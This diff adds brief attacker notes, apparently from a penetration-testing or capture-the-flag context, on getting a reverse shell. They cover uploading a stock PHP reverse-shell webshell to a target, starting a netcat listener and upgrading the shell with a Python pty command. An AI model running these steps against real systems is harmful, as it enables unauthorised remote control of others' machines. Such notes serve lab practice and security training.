@@ -1,0 +1,12 @@
+# You upload a script on the target system
+# e.g.: /usr/share/webshells/php/php-reverse-shell.php
+
+# IP: the host machine (local ip)
+# port: the same as netcat (e.g. 1234)
+
+# First you should also set up a netcat connection
+nc -lvnp 1234
+
+######### So you have a reverse shell ############
+# In order to have a functional shell you use:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
